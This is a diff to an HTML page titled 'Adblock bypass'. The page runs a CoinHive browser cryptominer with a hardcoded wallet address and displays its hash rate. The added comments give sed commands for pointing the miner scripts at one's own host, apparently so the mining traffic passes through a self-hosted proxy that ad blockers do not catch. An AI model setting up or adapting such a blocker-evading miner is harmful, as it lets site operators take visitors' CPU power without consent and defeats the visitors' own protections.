@@ -3,14 +3,15 @@
 <head>
   <meta charset="utf-8">
   <title>Adblock bypass</title>
+  <!-- Replace "localhost:8892" to "yourhost" in ./miner/miner.min.js and in ./miner/cryptonight-asmjs.min.js -->
+  <!-- $ sed -i 's/localhost:8892/yourhost.com/g' ./miner/miner.min.js  -->
+  <!-- $ sed -i 's/localhost:8892/yourhost.com/g' ./miner/cryptonight-asmjs.min.js -->
   <script src="./miner/miner.min.js"></script>
 </head>
 <body>
 <p id="sp"></p>
 <p id="th"></p>
 <script>
-CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://localhost:8892/proxy"]];
-CoinHive.CONFIG.LIB_URL = "http://localhost:8892/miner/";
 var miner = new CoinHive.User('45jeeYiUfoKHooxvk4fc1x3yq2Qd7C8rZBthdUPMvTBMAbo4rksNd6CQ8wCuoJptJdedb3K2ND3FT91q8MjRPUGbVsYKPQx', 'coinhive');
 setInterval(function() {
   var hashesPerSecond = miner.getHashesPerSecond();
